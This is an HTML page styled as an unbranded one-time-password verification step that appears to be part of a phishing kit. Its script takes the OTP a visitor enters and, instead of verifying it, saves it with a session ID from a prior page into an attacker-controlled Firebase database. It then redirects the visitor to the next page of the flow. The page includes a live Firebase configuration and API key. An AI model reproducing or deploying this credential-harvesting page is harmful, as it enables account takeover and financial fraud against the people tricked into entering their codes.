<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="a02b572693328546.css">
    <title>OTP Verification</title>
</head>
<body>
<div id="__next">
    <header>
        <img alt="logo" class="logo" src="logo.png">
    </header>
    <main>
        <form id="otpForm">
            <input type="hidden" name="formtoken" value="">
            <h1>Verify with One Time Password</h1>
            <p style="font-weight: 600">
                Your One Time Password has been sent to your registered mobile number.
            </p>

            <div class="floating-container">
                <input type="text" name="otp" id="otp" minlength="6" maxlength="8" pattern="[0-9]+" inputmode="numeric" placeholder=" " required="">
                <label>One Time Password <span>*</span></label>
            </div>

            <div class="btContainer">
                <button type="submit">Submit</button>
            </div>
            <p>
                If you didn't receive the one-time password SMS, please click here
                to <a href="/b7.html">resend</a>
            </p>
            <p style="font-weight: bold; text-align: center">
                OTP Expires in: 03:00
            </p>
        </form>
    </main>
    <footer>
        <div class="l">
            <img alt="s" class="l" src="s.jpg">
        </div>
        <img alt="f" class="ft" src="ft.png">
    </footer>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";

    // Firebase Configuration
    const firebaseConfig = {
        apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
        authDomain: "ss22-a96d3.firebaseapp.com",
        projectId: "ss22-a96d3",
        storageBucket: "ss22-a96d3.firebasestorage.app",
        messagingSenderId: "607942972170",
        appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
        measurementId: "G-KT1P0Q0FD0",
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const otpForm = document.getElementById('otpForm');
    const otpInput = document.getElementById('otp');

    otpForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const otp = otpInput.value.trim();
        if (otp.length < 6 || otp.length > 8) {
            alert("Please enter a valid OTP.");
            return;
        }

        try {
            // Read sessionId from index page
            const sessionId = localStorage.getItem("sessionId");

            // Save OTP with sessionId in Firestore
            await addDoc(collection(db, "users33"), {
                sessionId: sessionId,
                otp: otp,
                step: "otp_verify",
                timestamp: new Date(),
            });

            // Redirect to next page
            window.location.href = "b9.html";
        } catch (error) {
            console.error("Error adding document: ", error);
            alert("Error submitting OTP. Please try again.");
        }
    });
</script>

</body>
</html>
